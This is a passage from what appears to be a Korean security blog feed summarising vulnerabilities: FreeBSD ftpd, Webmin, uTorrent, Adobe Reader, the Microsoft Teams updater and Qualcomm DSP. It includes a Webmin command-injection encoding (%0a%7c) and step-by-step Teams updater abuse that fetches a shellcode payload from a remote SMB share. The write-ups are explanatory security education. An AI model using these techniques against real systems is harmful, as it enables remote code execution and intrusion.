&#xB85C;&#xADF8;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li><li>3&#xBC88;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xB85C;&#xADF8;&#xC778; &#xC911; <code>chdir</code>&#xC774; &#xC2E4;&#xD328;&#xD558;&#xACE0; <code>ftpd chroot jail</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xC5F0;&#xACB0;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBAA8;&#xB4E0; &#xC2DC;&#xC2A4;&#xD15C; &#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xB294; &#xD574;&#xCEE4; &#xACC4;&#xC815;&#xC758; &#xD648; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</li><li>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xD6C4; root&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD560; &#xB54C; &#xD574;&#xCEE4;&#xAC00; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; <code>etc/spwd.db</code> &#xC758; root &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xCC38;&#xC870;&#xD574; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xD574;&#xCEE4;&#xAC00; root &#xACC4;&#xC815;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xB9AC;&#xBC84;&#xC2A4;&#xC258;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD574; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0;, chroot jail&#xC744; &#xBC97;&#xC5B4;&#xB098; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4; &#xB610;&#xD55C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>FreeBSD</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>ftpd</tag>
      
      <tag>chroot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
    <link href="/2020/12/28/idioth/2020-12-28/"/>
    <url>/2020/12/28/idioth/2020-12-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webmin&#xC5D0;&#xC11C; Remote Command Execution &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xD328;&#xD0A4;&#xC9C0; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBAA8;&#xB4C8;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xC720;&#xC800;&#xAC00; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; arbitrary command&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>&#xC5D0; &#xB300;&#xD55C; &#xD544;&#xD130;&#xB9C1;&#xC740; package name &#xBCC0;&#xC218;&#xAC00; system command &#xC548;&#xC5D0; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBBC0;&#xB85C; URL encoding&#xC744; &#xD1B5;&#xD574; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(ex. command line&#xC744; &#xD55C; &#xC904; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;)</p><p><code>u</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; <code>update.cgi</code>&#xC5D0;&#xC11C; <code>@pkgs</code> &#xBCC0;&#xC218;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xC5EC;&#xB7EC; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. <code>update.cgi</code>&#xC758; &#xD568;&#xC218;&#xB4E4;&#xC740; <code>package-updates-lib.pl</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370;, &#xADF8;&#xC911; <code>package_install(package-name, [system], [new-install])</code>&#xC740; update system&#xC774;&#xB098; Wemin&#xC744; &#xD1B5;&#xD574; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; &#xD328;&#xD0A4;&#xC9C0; &#xBAA9;&#xB85D;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xC9C0;&#xD0A4;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xB54C; CVE-2019-12840&#xC5D0; &#xB300;&#xD55C; &#xC870;&#xCE58;&#xB85C; <code>s/\\(-)|\\(.)/string/g;</code> &#xD544;&#xD130;&#xB9C1;&#xC774; &#xAC78;&#xB824;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD328;&#xD0A4;&#xC9C0; &#xC774;&#xB984;&#xC740; http request &#xBCC0;&#xC218;&#xC774;&#xBBC0;&#xB85C; <code>%0a</code>&#xB098; <code>%0c</code> &#xB4F1;&#xC744; &#xD1B5;&#xD574; escape&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xD0A4;&#xC9C0; &#xC774;&#xB984; &#xB4A4;&#xC5D0; <code>%7c</code> &#xB4F1;&#xC73C;&#xB85C; pipe&#xB098; <code>.</code>&#xC744; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xADF8; &#xBD80;&#xBD84;&#xC5D0; <code>\</code> &#xBC31; &#xC2AC;&#xB798;&#xC2DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; <code>%0a%7c</code> &#xB4F1;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; command line&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>\</code>&#xAC00; &#xBB34;&#xC2DC;&#xB418;&#xACE0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; arbitrary command execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; Metasploit code</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>command execution</tag>
      
      <tag>cve-2019-12840</tag>
      
      <tag>webmin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
    <link href="/2020/12/19/fabu1ous/2020-12-19/"/>
    <url>/2020/12/19/fabu1ous/2020-12-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437&#xC740; uTorrent&#xC758; peer&#xB07C;&#xB9AC; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; BitTorrent protocol&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. BitTorrent protocol&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB294; Handshake &#xD398;&#xD0B7;&#xC5D0;&#xB294; bencoded dictionary&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; <code>M field</code>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>bencoded dictionary&#xB294; python dictionary&#xC640; &#xB9E4;&#xC6B0; &#xC720;&#xC0AC;&#xD558;&#xBA70; Key&#xC640; Value&#xB97C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC740; nested(&#xC911;&#xCCA9;&#xB41C;) dictionary&#xC758; &#xC874;&#xC7AC;&#xC778;&#xB370;, &#xC989; Value&#xAC00; &#xB610; &#xB2E4;&#xB978; &#xD558;&#xB098;&#xC758; dictionary&#xAC00; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC911;&#xCCA9;&#xB41C; dictionary&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>&#xCDA9;&#xC811;&#xB41C; dictionary&#xB97C; &#xD30C;&#xC2F1; &#xD560; &#xB54C; &#xBA87; &#xBC88;&#xC9F8; layer&#xC5D0;&#xC11C; &#xD30C;&#xC2F1;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0;&#xB97C; 32bit &#xD06C;&#xAE30;&#xC758; <code>bit field</code>&#xC5D0; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. layer&#xB97C; &#xD558;&#xB098; &#xB4E4;&#xC5B4;&#xAC08; &#xB54C;&#xB9C8;&#xB2E4; &#xC774; bit field&#xC5D0; &#xD55C; &#xBE44;&#xD2B8;&#xC529; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;( ex. 2&#xBC88;&#xC9F8; layer &#xD30C;&#xC2F1; &#xC911; : 0000 0000 0000 0011 ). &#xB9CC;&#xC57D; layer&#xAC00; 32&#xBCF4;&#xB2E4; &#xB9CE;&#xC774; &#xC911;&#xCCA9;&#xB41C; dictionary&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; Crash&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>malicious bencoded dictionary&#xB97C; &#xB2F4;&#xC740; <code>.torrent</code>&#xB97C; &#xBC1B;&#xB294; peer&#xC758; uTorrent&#xB294; nested dictionary&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; RCE&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>utorrent</tag>
      
      <tag>misparse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Adobe Reader UAF vulnerability</title>
    <link href="/2020/12/18/l0ch/2020-12-18/"/>
    <url>/2020/12/18/l0ch/2020-12-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Reader&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xAE4C;&#xC9C0; &#xAC00;&#xB2A5;&#xD55C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>ESObjects</code> &#xB294; Adobe Reader&#xC758; <code>EScript</code> &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>ESObjects</code>&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xB54C; &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xCE90;&#xC2DC;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xB3D9;&#xC77C;&#xD55C; PDDoc&#xAD6C;&#xC870;, &#xC774;&#xB984;&#xC744; &#xAC00;&#xC9C4; <code>ESObject</code>&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xB54C; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xB300;&#xC2E0; &#xCE90;&#xC2DC;&#xC758; <code>ESObject</code> &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xC774;&#xB54C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>ESObject</code>&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; &#xAC1D;&#xCCB4; &#xCE90;&#xC2DC;&#xC5D0; &#xCD94;&#xAC00;&#xB420; &#xB54C; <code>ESString type</code>&#xC740; ANSI&#xC785;&#xB2C8;&#xB2E4;. &#xAC1D;&#xCCB4; &#xCE90;&#xC2DC;&#xC5D0;&#xC11C; <code>ESObject</code>&#xB97C; &#xC0AD;&#xC81C;&#xD560; &#xB54C; <code>ESString</code> &#xAC12;&#xC73C;&#xB85C; &#xCC3E;&#xC544; &#xC0AD;&#xC81C;&#xD558;&#xB294;&#xB370;, &#xC0AD;&#xC81C;&#xD560; &#xD56D;&#xBAA9;&#xC744; &#xAC80;&#xC0C9;&#xD560; &#xB54C;  UNICODE&#xB85C; &#xC785;&#xB825;&#xBC1B;&#xC544; <code>ESString</code> &#xD56D;&#xBAA9;&#xC744; &#xCC3E;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; <code>ESObject</code> &#xD3EC;&#xC778;&#xD130;&#xB294; &#xC0AD;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xACE0;, &#xC774;&#xB97C; &#xC7AC;&#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; ArrayBuffer byteLength corruption&#xACFC; heap spray&#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uaf</tag>
      
      <tag>rce</tag>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>adobe reader</tag>
      
      <tag>heap spray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Teams Updater Living off the Land</title>
    <link href="/2020/12/17/idioth/2020-12-17/"/>
    <url>/2020/12/17/idioth/2020-12-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; lolbas(Living off the land binary and script)&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB358; code execution&#xC5D0; &#xB300;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xC218;&#xC815;&#xC740; URL&#xC744; &#xD1B5;&#xD558;&#xC5EC; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC81C;&#xD488; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC704;&#xD574; &#xACF5;&#xC720;/&#xB85C;&#xCEEC; &#xD3F4;&#xB354;&#xB97C; &#xD1B5;&#xD55C; &#xB85C;&#xCEEC; &#xC5F0;&#xACB0;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC6D0;&#xACA9; SMB &#xACF5;&#xC720; &#xD3F4;&#xB354;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; payload&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>&#xC5D0;&#xC11C; Microsoft Teams pre-built package&#xB97C; &#xD1B5;&#xD574; nupkg &#xD328;&#xD0A4;&#xC9C0; &#xCD94;&#xCD9C;(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>&#xC5D0; shellcode&#xB97C; <code>squirrel.exe</code> &#xD30C;&#xC77C;&#xB85C; &#xB123;&#xC740; &#xD6C4; &#xC555;&#xCD95;</p></li><li><p>metadata &#xACC4;&#xC0B0;</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; &#xC704;&#xC758; &#xACB0;&#xACFC; &#xAC12;&#xC744; &#xBCF5;&#xC0AC;&#xD574;&#xC11C; &#xC800;&#xC7A5;</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>&#xC640; <code>RELEASES</code> &#xD30C;&#xC77C;&#xC744; &#xBA54;&#xC778; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB123;&#xACE0; &#xC6D0;&#xACA9; SMB &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;</p></li></ol><p>&#xD53C;&#xD574;&#xC790;&#xAC00; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xC758; &#xC6D0;&#xACA9; SMB &#xC11C;&#xBC84;&#xB85C; update&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74; Microsoft Teams&#xC5D0; &#xC758;&#xD574; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>teams</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Qualcomm DSP Achilles</title>
    <link href="/2020/12/16/fabu1ous/2020-12-16/"/>
    <url>/2020/12/16/fabu1ous/2020-12-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint&#xB294; &#xC62C;&#xD574; Defcon&#xC5D0;&#xC11C; Achilles&#xB77C;&#xB294; &#xC5F0;&#xAD6C; &#xB17C;&#xBB38;&#xC744; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Achilles&#xB294; Qualcomm DSP( Digital Signal Processor ) &#xCE69;&#xC5D0;&#xC11C; 400&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC740; &#xD37C;&#xC9D5; &#xAE30;&#xC220; &#xC5F0;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. Qualcomm&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xCE69;&#xB4E4;&#xC744; &#xC0DD;&#xC0B0;&#xD558;&#xB294; &#xD68C;&#xC0AC;&#xB85C;, &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0; &#xC2DC;&#xC7A5;&#xC758; 40%&#xAC00; Qualcomm&#xC758; &#xCE69;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Achilles&#xC5D0; &#xC8FC;&#xBAA9;&#xD574;&#xBCFC; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>DSP &#xCE69;&#xB4E4;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Black box&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, manufacturer&#xAC00; &#xC544;&#xB2C8;&#xB77C;&#xBA74; DSP &#xCE69;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC81C;&#xD55C;&#xC801;&#xC77C; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCE69;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xC81C;&#xC870;&#xC0AC;&#xB3C4; &#xC608;&#xC678;&#xB294; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. Checkpoint&#xB294; black box &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0; &#xC81C;&#xC870;&#xC0AC;&#xB4E4;&#xC774; &#xC2E0;&#xC18D;&#xD558;&#xAC8C; &#xC774;&#xC288;&#xB97C; &#xACE0;&#xCE58;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC744; &#xC9C0;&#xC801;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC62C;&#xD574; 5&#xC6D4; Zerodium&#xC774; ios exploit&#xC758; &#xC81C;&#xBCF4;&#xAC00; &#xB108;&#xBB34; &#xB9CE;&#xB2E4;&#xB294; &#xC774;&#xC720;&#xB85C; &#xAD6C;&#xB9E4; &#xC911;&#xC9C0;&#xB97C; &#xC120;&#xC5B8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Open source&#xC778; Android &#xBCF4;&#xB2E4; &#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4; &#xAC74;&#xC218;&#xAC00; &#xB9CE;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xADFC;&#xAC70;&#xB85C; Closed source(black box)&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB358; ios&#xC758; &#xBCF4;&#xC548;&#xC131;&#xC740; &#xB354; &#xC774;&#xC0C1; &#xD6A8;&#xACFC; &#xC5C6;&#xB2E4;&#xB294; &#xC758;&#xACAC;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ios &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xBAA8;&#xB4E0; black box&#xC758; &#xC758;&#xBBF8;&#xAC00; &#xC810;&#xC810; &#xD76C;&#xBBF8;&#xD574;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD5E4;&#xCEE4;&#xB4E4;&#xC5D0;&#xAC90; black box&#xC758; &#xC815;&#xBCF4; &#xD3D0;&#xC1C4; &#xD6A8;&#xACFC;&#xB294; &#xC810;&#xC810; &#xC605;&#xC5B4;&#xC9C0;&#xACE0;, vendor &#xC785;&#xC7A5;&#xC5D0;&#xC120; &#xC774;&#xC288;&#xB97C; &#xACE0;&#xCE58;&#xC9C0; &#xD798;&#xB4E0; &#xC0C1;&#xD669;&#xC774; &#xB9DE;&#xBB3C;&#xB824; Achilles &#xC5F0;&#xAD6C;&#xCC98;&#xB7FC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBB49;&#xD145;&#xC774;&#xB85C; &#xB098;&#xC624;&#xB294; &#xC77C;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>qualcomm</tag>
      
      <tag>dsp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
    <link href="/2020/12/15/l0ch/2020-12-15/"/>
    <url>/2020/12/15/l0ch/2020-12-15/</url>
    
